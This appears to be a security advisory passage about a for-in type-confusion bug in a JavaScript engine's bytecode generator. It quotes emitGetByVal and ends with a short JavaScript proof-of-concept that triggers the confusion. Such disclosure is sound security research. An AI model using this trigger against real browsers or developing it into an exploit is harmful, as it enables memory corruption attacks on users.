@@ -1,0 +1,80 @@
+Let's start with JS code.
+
+let o = {};
+for (let i in {xx: 0}) {
+    o[i]; <<-------- (a)
+}
+
+When the code generator meets (a), it will call BytecodeGenerator::emitGetByVal.
+
+Here's the code of BytecodeGenerator::emitGetByVal.
+
+RegisterID* BytecodeGenerator::emitGetByVal(RegisterID* dst, RegisterID* base, RegisterID* property)
+{
+    for (size_t i = m_forInContextStack.size(); i > 0; i--) {
+        ForInContext& context = m_forInContextStack[i - 1].get();
+        if (context.local() != property)
+            continue;
+
+        if (!context.isValid())
+            break;
+
+        if (context.type() == ForInContext::IndexedForInContextType) {
+            property = static_cast<IndexedForInContext&>(context).index();
+            break;
+        }
+
+        ASSERT(context.type() == ForInContext::StructureForInContextType);
+        StructureForInContext& structureContext = static_cast<StructureForInContext&>(context);
+        UnlinkedValueProfile profile = emitProfiledOpcode(op_get_direct_pname);
+        instructions().append(kill(dst));
+        instructions().append(base->index());
+        instructions().append(property->index());
+        instructions().append(structureContext.index()->index());
+        instructions().append(structureContext.enumerator()->index());
+        instructions().append(profile);
+        return dst;
+    }
+
+    UnlinkedArrayProfile arrayProfile = newArrayProfile();
+    UnlinkedValueProfile profile = emitProfiledOpcode(op_get_by_val);
+    instructions().append(kill(dst));
+    instructions().append(base->index());
+    instructions().append(property->index());
+    instructions().append(arrayProfile);
+    instructions().append(profile);
+    return dst;
+}
+
+The method uses op_get_by_val to handle expressions like "o[i]". But, there is a fast path, which uses op_get_direct_pname, for when the index variable is a string. op_get_direct_pname is designed for a string index only. So if other types are used as indexes, it will cause type confusions. In the above JS code, it's very clear that "i" will be a string("xx") semantically. Therefore, it will use op_get_direct_pname to handle it.
+
+Here's another example.
+
+let o = {};
+for (let i in {xx: 0}) {
+    o[i]; <<-------- (a)
+    i = 0x123456; <<-------- (b)
+    o[i]; <<-------- (c)
+}
+
+In this case, it will use op_get_direct_pname at (a). And at (b), since the index variable "i" is replaced, the invalidate method of the ForInContext object that makes "context.isValid()" return false is called. So, op_get_by_val will be used at (c).
+
+But the problem is that it can't properly handle the following case which cause a type confusion.
+
+let o = {};
+for (let i in {xx: 0}) {
+    for (let j = 0; j < 2; j++) {
+        o[i];  // When j == 1, op_get_direct_pname was already emitted, but i is not a string anymore.
+        i = 0;
+    }
+}
+
+PoC:
+let o = {};
+for (let i in {xx: 0}) {
+    for (let j = 0; j < 2; j++) {
+        o[i];
+        i = new Uint32Array([0, 1, 0x777777, 0, 0]);
+    }
+}
+
